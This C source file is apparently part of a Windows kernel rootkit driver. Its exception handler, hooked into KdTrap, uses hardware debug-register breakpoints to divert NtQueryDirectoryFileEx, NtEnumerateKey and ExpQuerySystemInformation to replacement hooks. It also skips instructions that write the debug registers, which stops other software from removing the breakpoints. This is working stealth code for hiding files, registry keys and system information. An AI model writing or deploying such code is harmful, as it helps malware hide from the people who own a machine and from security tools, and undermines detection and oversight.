#include <ntifs.h>
#include <intrin.h>

#include "handler.h"
#include "Hook-KdTrap/HookKdTrap.h"
#include "hde/hde64.h"
#include "querydir.h"
#include "enumkey.h"
#include "querysystem.h"


uint32_t drHit = 0;

__declspec(noinline) BOOLEAN fun(int n, int m);

__declspec(noinline) BOOLEAN hooked() {
	DbgPrintEx(0, 0, "[Bot] Hook\n");
	return TRUE;
}

/*
NTSTATUS hookNtQueryDirectoryFileEx() {
	NTSTATUS result = NtQueryDirectoryFileEx();

	return result;
}
*/

BOOLEAN handler(PEXCEPTION_RECORD ExceptionRecord, PCONTEXT Context) {
	hde64s hs;
	uint64_t dr6;
	BOOLEAN result = FALSE;
	if (ExceptionRecord->ExceptionCode == STATUS_BREAKPOINT || ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
		dr6 = __readdr(6);

		if (Context->Rip == NtQueryDirectoryFileEx) {
			Context->Rip = hookNtQueryDirectoryFileEx;
			//Context->EFlags |= 1 << 16;
			result = TRUE;
		}
		if (Context->Rip == funAddr.NtEnumerateKey) {
			Context->Rip = hookNtEnumerateKey;
			result = TRUE;
		}
		if (Context->Rip == funAddr.ExpQuerySystemInformation) {
			Context->Rip = hookExpQuerySystemInformation;
			result = TRUE;
		}
		if (dr6 & (1 << 13)) {
			hde64_disasm((PVOID)Context->Rip, &hs);
			if (hs.opcode == 0x0f && hs.opcode2 == 0x23) {
				Context->Rip += hs.len;
			} else {
				//TODO: subject to change
				Context->EFlags |= 1 << 16;
			}
			result = TRUE;
		}
		/*
		if ((dr6 = __readdr(6)) & 0x1) {
			InterlockedExchange(&drHit, 1);

			//Context->Rip += hde64_disasm((PVOID)Context->Rip, &hs);

			Context->Rsp -= 0x8;
			//*(uint64_t*)Context->Rsp = Context->Rip;
			//Context->Rip = (uint64_t)hooked;
			*(uint64_t*)Context->Rsp = (uint64_t)hookNtQueryDirectoryFileEx;
		}
		*/
		dr6 &= ~(0xf | 1 << 13 | 1 << 14);
		__writedr(6, dr6);
		//Context->EFlags |= 1 << 16;
	}
	return result;
}